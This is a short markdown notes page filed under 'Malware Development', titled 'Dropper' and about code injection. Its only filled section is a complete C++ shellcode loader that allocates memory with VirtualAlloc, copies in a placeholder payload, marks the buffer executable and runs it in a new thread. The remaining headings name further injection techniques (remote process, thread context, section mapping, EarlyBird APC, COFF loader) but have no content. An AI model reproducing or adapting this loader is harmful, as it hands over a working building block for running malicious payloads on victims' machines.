---
title: Dropper
category: Malware Development
order: 2
---

Code Injection techniques.

# Basic Loader (VirtualAlloc)

```cpp
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	unsigned char payload[] = { 0x00, 0x00,...};
	unsigned int payload_len = sizeof(payload);

	// Allocate a memory buffer for payload
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Copy payload to new buffer
	RtlMoveMemory(exec_mem, payload, payload_len);

	// Make new buffer as executable
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}
```

# Remote Process (VirtualAllocEx)


# Thread Context (GetThreadContext)


# Sections and View (NtMapViewOfSection)


# EarlyBird (QueueUserAPC)


# ApiReeKall (RtlRemoteCall)


# COFF Loader (mokosh)